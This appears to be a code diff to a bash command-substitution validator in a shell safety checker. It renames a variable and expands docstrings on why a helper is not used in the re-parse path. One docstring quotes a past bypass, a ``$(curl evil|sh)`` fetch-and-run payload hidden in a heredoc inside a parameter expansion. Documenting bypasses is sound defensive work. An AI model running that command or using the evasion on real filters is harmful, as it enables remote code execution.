@@ -945,7 +945,9 @@ class SubstitutionValidator:
         while the whitelisted ``$(date)`` decoded beside it kept the fail-closed fallback
         from firing. ``echo "${x:-$(date) cat <<IN`` / ``$(curl evil|sh)`` / ``IN }"`` was
         ALLOWED/SAFE while bash ran it. Still do NOT wire ``_find_outer_command`` (whose own
-        docstring invites exactly that) into this path.
+        docstring invites exactly that) into this path: it walks the top-level ``ast_nodes``,
+        where this subtree does not exist, so it would name the outer command for a body it
+        never saw.
 
         THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
         ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
@@ -984,13 +986,13 @@ class SubstitutionValidator:
             return []
 
         if depth < MAX_SUBSTITUTION_DEPTH:
-            source = value.replace("#", "_")
+            reparsed = value.replace("#", "_")
             try:
-                inner_ast = self.parser.parse(source)
+                inner_ast = self.parser.parse(reparsed)
             except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
                 logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
             else:
-                decoded = self.extract_substitutions(inner_ast, depth + 1, source, budget)
+                decoded = self.extract_substitutions(inner_ast, depth + 1, reparsed, budget)
                 if decoded:
                     return decoded
 
@@ -1057,7 +1059,7 @@ class SubstitutionValidator:
         nested inside this body slices ``command`` by those positions (the paragraph on
         reading the body from the source, one level down). Handed the outer command it read
         a shifted slice of the wrong string. Do NOT wire ``_find_outer_command`` into this
-        path.
+        path, for the reason given one function up.
 
         Cost: a substring scan for a body carrying no introducer, which is every everyday
         shape -- config files, commit bodies, plain text. A body that does carry one
